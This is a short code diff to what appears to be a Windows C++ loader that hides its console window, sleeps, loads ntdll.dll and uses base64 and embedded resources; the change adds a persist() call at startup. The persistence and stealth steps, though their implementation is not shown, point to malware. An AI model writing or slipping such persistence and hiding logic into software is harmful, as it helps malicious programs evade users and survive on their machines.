@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include <string>
 #include "ntdll.h"
+#include "persist.h"
 #include "base64.h"
 #include "resource.h"
 
@@ -15,6 +16,7 @@ int main(int argc, char** argv)
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	sleep();
+	persist();
 
 	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
 	if (ntdll == NULL)
